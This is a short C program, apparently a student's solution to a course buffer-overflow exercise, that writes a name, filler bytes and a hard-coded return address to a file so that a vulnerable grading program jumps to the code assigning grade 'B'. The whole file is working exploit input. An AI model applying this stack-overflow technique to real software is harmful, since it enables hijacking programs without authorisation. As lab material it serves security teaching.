#include <stdio.h>

int main(void) {
    /* file to write to */
    FILE *psFile;
    /* address to break to */
    unsigned long ulAddress;
    /* our names (truncated) */
    char* name = "Jacob";
    /* counter to iterate through for loops */
    int i;

    psFile = fopen("data", "w");

    /* write name to file */
    for (i = 0; i < 5; i++) {
        char n = *name;
        fprintf(psFile, "%c", n);
        name++;
    }

    /* write null terminator to file */
    putc('\0', psFile);

    /* write filler to overflow buf */
    for (i = 0; i < 42; i++) {
        fprintf(psFile, "%c", 'a');
    }
   
    /* write address of grade = 'B' */
    ulAddress = 0x400858;
    fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);

    fclose(psFile);
    return 0;
}
